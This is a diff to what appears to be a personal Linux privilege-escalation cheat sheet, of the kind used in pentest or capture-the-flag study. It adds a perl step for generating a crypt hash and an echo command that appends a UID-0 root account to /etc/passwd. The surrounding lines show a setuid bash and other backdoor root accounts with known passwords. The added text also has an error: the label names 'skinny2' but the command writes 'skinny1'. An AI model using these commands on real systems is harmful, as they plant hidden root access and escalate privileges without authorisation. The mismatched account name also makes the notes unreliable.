@@ -87,6 +87,8 @@ chmod +s /bin/bash
 > 1. Making user **fm** the root by typing command ->  echo 'fm::0:0:root:/root:/bin/bash' >> /etc/passwd
 > 1. openssl for generating password hashes command -> openssl passwd -1
 > 1. username:password === **skinny1:123** ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
+> 1. or use perl for generating password. (e.g. command ```perl -le 'print crypt("pass123", "abc")'``` will genrate hash of **abBxjdJQWn8xw**)
+> 1. username:password === **skinny2:pass123** ```echo 'skinny1:abBxjdJQWn8xw:0:0:root:/root:/bin/bash' >> /etc/passwd```
 
 #### PrivESC Methodology for Linux - /etc/shadow
 > 1. $6$ password hash can be generating by running ```openssl passwd -6```
